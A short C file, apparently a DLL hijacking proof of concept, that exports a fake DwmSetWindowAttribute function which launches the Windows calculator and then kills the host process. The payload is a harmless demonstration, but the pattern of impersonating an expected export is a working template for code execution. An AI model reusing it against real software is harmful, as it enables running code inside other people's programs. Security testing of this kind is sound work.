#include <windows.h>
#define DllExport __declspec (dllexport)
DllExport void DwmSetWindowAttribute() { egg(); }

int egg()
{
    system ("calc");
        exit(0);
        return 0;
}

